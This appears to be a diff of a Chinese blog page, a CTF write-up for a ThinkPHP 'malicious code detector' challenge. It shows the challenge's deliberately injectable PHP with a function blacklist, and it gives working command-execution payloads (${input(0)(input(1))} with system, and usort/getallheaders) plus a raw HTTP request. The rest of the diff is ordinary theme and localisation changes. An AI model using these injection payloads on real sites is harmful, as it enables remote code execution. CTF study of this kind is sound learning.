&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$attack_word</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;检测到危险代码: &#x27;</span>.<span class="variable">$attack_word</span>.<span class="string">&#x27;！！！&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            	  <span class="keyword">echo</span> <span class="string">&#x27;欢迎使用gxngxngxn的恶意代码检测器！！！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$safe_log_file</span> = <span class="string">&#x27;/tmp/safe.log&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$safe_log_file</span>)) &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">&#x27;$safe_word=&quot;&#x27;</span>.<span class="variable">$code</span>.<span class="string">&#x27;&quot;;&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">&#x27;/tmp/safe.log&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$safe_word</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;未检测到危险代码，&#x27;</span>.<span class="variable">$safe_word</span>.<span class="string">&#x27;，非常安全&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            	  <span class="keyword">echo</span> <span class="string">&#x27;欢迎使用gxngxngxn的恶意代码检测器！！！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">"/[\";'%\\\\]/"</span>, <span class="string">''</span>, <span class="variable">$_POST</span>[<span class="string">'code'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">'/openlog|syslog|readlink|mail|symlink|popen|passthru|scandir|show_source|assert|fwrite|curl|php|system|eval|cookie|assert|new|session|str|source|passthru|exec|request|require|include|link|base|exec|reverse|open|popen|getallheaders|next|prev|f|conv|ch|hex|end|ord|post|get|array_reverse|\~|\`|\#|\%|\^|\&amp;|\*|\-|\+|\[|\]|\_|\&lt;|\&gt;|\/|\?|\\\\/is'</span>, <span class="variable">$code</span>)) {</span><br><span class="line"></span><br><span class="line">            <span class="variable">$attack_log_file</span> = <span class="string">'/tmp/attack.log'</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$attack_log_file</span>)) {</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">'$attack_word=\''</span>.<span class="variable">$code</span>.<span class="string">'\';'</span>.<span class="string">"\r\n"</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">'/tmp/attack.log'</span>);</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$attack_log_file</span>, <span class="string">'&lt;'</span>.<span class="string">'?'</span>.<span class="string">'php'</span>.<span class="string">"\r\n"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$attack_word</span>)){</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'检测到危险代码: '</span>.<span class="variable">$attack_word</span>.<span class="string">'！！！'</span>;</span><br><span class="line">            } <span class="keyword">else</span>{</span><br><span class="line">            	  <span class="keyword">echo</span> <span class="string">'欢迎使用gxngxngxn的恶意代码检测器！！！'</span>;</span><br><span class="line">            }</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="variable">$safe_log_file</span> = <span class="string">'/tmp/safe.log'</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$safe_log_file</span>)) {</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">'$safe_word="'</span>.<span class="variable">$code</span>.<span class="string">'";'</span>.<span class="string">"\r\n"</span>,FILE_APPEND);</span><br><span class="line">                <span class="keyword">require_once</span>(<span class="string">'/tmp/safe.log'</span>);</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$safe_log_file</span>, <span class="string">'&lt;'</span>.<span class="string">'?'</span>.<span class="string">'php'</span>.<span class="string">"\r\n"</span>);</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$safe_word</span>)){</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'未检测到危险代码，'</span>.<span class="variable">$safe_word</span>.<span class="string">'，非常安全'</span>;</span><br><span class="line">            } <span class="keyword">else</span>{</span><br><span class="line">            	  <span class="keyword">echo</span> <span class="string">'欢迎使用gxngxngxn的恶意代码检测器！！！'</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>并且不难发现这是thinkphp的网站 那么肯定是和tp有关的特性 我自己做的时候不知道 后面看wp才知道</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 ThinkPHP（TP）框架中，$&#123;&#125; 符号常用于模板引擎的表达式解析。在模板中，$&#123;&#125; 可以嵌入 PHP 表达式，这些表达式会被解析并执行。它通常用于输出数据或在模板中执行一些简单的 PHP 逻辑。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 ThinkPHP（TP）框架中，${} 符号常用于模板引擎的表达式解析。在模板中，${} 可以嵌入 PHP 表达式，这些表达式会被解析并执行。它通常用于输出数据或在模板中执行一些简单的 PHP 逻辑。</span><br></pre></td></tr></tbody></table></figure>
 
 <p>可以使用${}</p>
 <p>1.使用input函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input() 是 ThinkPHP 6 中的一个函数。它是 ThinkPHP 框架提供的一个用来获取请求数据（如 GET、POST 或 PUT 请求中的参数）的函数。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input() 是 ThinkPHP 6 中的一个函数。它是 ThinkPHP 框架提供的一个用来获取请求数据（如 GET、POST 或 PUT 请求中的参数）的函数。</span><br></pre></td></tr></tbody></table></figure>
 
-<p><code>code=$&#123;input(0)(input(1))&#125;&amp;0=system&amp;1=cat+/f*</code></p>
+<p><code>code=${input(0)(input(1))}&amp;0=system&amp;1=cat+/f*</code></p>
 <p>2.使用unsort</p>
-<p><code>code=$&#123;usort((ge.tallheaders)(),sys.tem)&#125;</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20012</span><br><span class="line">aaa: ls</span><br><span class="line">Content-Length: 41</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://gz.imxbt.cn:20012</span><br><span class="line">Referer: http://gz.imxbt.cn:20012/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: csrftoken=OaW6pVSwc7zWaWovIsxPogO3TESlFCY0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p><code>code=${usort((ge.tallheaders)(),sys.tem)}</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/index.php HTTP/1.1</span><br><span class="line">Host: gz.imxbt.cn:20012</span><br><span class="line">aaa: ls</span><br><span class="line">Content-Length: 41</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://gz.imxbt.cn:20012</span><br><span class="line">Referer: http://gz.imxbt.cn:20012/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: csrftoken=OaW6pVSwc7zWaWovIsxPogO3TESlFCY0</span><br><span class="line">Connection: close</span><br></pre></td></tr></tbody></table></figure>
 
 </article>
 <div class="article-footer">
     <section id="license">
-      <div class="header"><span>License</span></div>
+      <div class="header"><span>许可协议</span></div>
       <div class="body"><p>This article is licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a>. Please include attribution when reposting.</p>
 </div>
     </section>
@@ -140,7 +139,7 @@
 
 </div>
 
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2025/04/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化学习</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2025/04/09/XYCTF2025-WEB/">XYCTF2025-WEB WP</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2025/04/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化学习</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2025/04/09/XYCTF2025-WEB/">XYCTF2025-WEB WP</a></div></section></div>
 
 
 
@@ -154,26 +153,26 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%B6%E9%BE%99%E7%89%8CWAF"><span class="toc-text">奶龙牌WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#move-uploaded-file-%E5%87%BD%E6%95%B0"><span class="toc-text">move_uploaded_file 函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%E5%92%8C%E7%94%A8%E6%B3%95%EF%BC%9A"><span class="toc-text">定义和用法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%EF%BC%9A"><span class="toc-text">语法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA"><span class="toc-text">提示</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%81%9A%E6%B3%95"><span class="toc-text">题目做法:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B%E5%99%A8"><span class="toc-text">恶意代码检测器</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
-</div></aside><div class='float-panel'>
-  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
-    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"></path></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%B6%E9%BE%99%E7%89%8CWAF"><span class="toc-text">奶龙牌WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#move-uploaded-file-%E5%87%BD%E6%95%B0"><span class="toc-text">move_uploaded_file 函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%E5%92%8C%E7%94%A8%E6%B3%95%EF%BC%9A"><span class="toc-text">定义和用法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%EF%BC%9A"><span class="toc-text">语法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA"><span class="toc-text">提示</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%81%9A%E6%B3%95"><span class="toc-text">题目做法:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B%E5%99%A8"><span class="toc-text">恶意代码检测器</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"></path><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"></path></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class="float-panel">
+  <button type="button" style="display:none" class="laptop-only rightbar-toggle mobile" onclick="sidebar.rightbar()">
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"></path></svg>
   </button>
-  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
-    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  <button type="button" style="display:none" class="mobile-only leftbar-toggle mobile" onclick="sidebar.leftbar()">
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"></path><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"></path></g></svg>
   </button>
 </div>
 </div><div class="scripts">
 
 
 <script type="text/javascript">
-  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  window.canonical = {"originalHost":"sauy.top","officialHosts":["localhost","127.0.0.1"],"encoded":"c2F1eS50b3A="};
   const ctx = {
     date_suffix: {
-      just: `Just`,
-      min: `minutes ago`,
-      hour: `hours ago`,
-      day: `days ago`,
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
     },
     root : `/`,
     tag_plugins: {
@@ -246,6 +245,8 @@
     }
   }
 
+  const scriptLoads = new Map();
+
   const utils = {
     // 懒加载 css https://github.com/filamentgroup/loadCSS
     css: (href, before, media, attributes) => {
@@ -306,29 +307,40 @@
       return ss;
     },
 
-    js: (src, opt) => new Promise((resolve, reject) => {
-      var script = document.createElement('script');
+    js: (src, opt) => {
       if (src.startsWith('/')) {
         src = ctx.root + src.substring(1);
       }
-      script.src = src;
-      if (opt) {
-        for (let key of Object.keys(opt)) {
-          script[key] = opt[key]
+      const key = new URL(src, document.baseURI).href;
+      if (scriptLoads.has(key)) return scriptLoads.get(key);
+
+      const promise = new Promise((resolve, reject) => {
+        var script = document.createElement('script');
+        script.src = key;
+        if (opt) {
+          for (let key of Object.keys(opt)) {
+            script[key] = opt[key]
+          }
+        } else {
+          // 默认异步，如果需要同步，第二个参数传入 {} 即可
+          script.async = true
         }
-      } else {
-        // 默认异步，如果需要同步，第二个参数传入 {} 即可
-        script.async = true
-      }
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function () {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    }),
+        script.onerror = () => {
+          scriptLoads.delete(key);
+          script.remove();
+          reject(new Error(`脚本加载失败: ${key}`));
+        };
+        script.onload = script.onreadystatechange = function () {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(script)
+      });
+      scriptLoads.set(key, promise);
+      return promise;
+    },
 
     jq: (fn) => {
       if (typeof jQuery === 'undefined') {
@@ -455,6 +467,7 @@
     push: utils.dark.method.toggle.push,
   });
 </script>
+
 <script>
   const sidebar = {
     leftbar: () => {
@@ -508,7 +521,7 @@
   })()
 </script>
 
-<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script async="" src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
 <script>
   // https://www.npmjs.com/package/vanilla-lazyload
   // Set the options globally
@@ -577,7 +590,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=1.33.1" defer></script>
+<script src="/js/main.js?v=1.33.1" defer=""></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -628,9 +641,9 @@
     utils.dark.method.toggle.start();
 
     const messages = {
-      light: `Switched to Light Mode`,
-      dark: `Switched to Dark Mode`,
-      auto: `Switched to Auto Mode`,
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
     }
     hud?.toast?.(messages[newTheme])
   }
@@ -652,7 +665,7 @@
 
 
 
-<script defer>
+<script defer="">
   window.addEventListener('DOMContentLoaded', (event) => {
     ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
     for (let id of Object.keys(ctx.services)) {
@@ -788,7 +801,7 @@
     hoverDelay: 25
   };
 </script>
-<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+<script defer="" src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
   ctx.fancybox = {
     selector: `.timenode p>img`,
     css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
@@ -867,4 +880,5 @@
 
 <!-- inject -->
 
-</div></body></html>
+</div>
+</body></html>
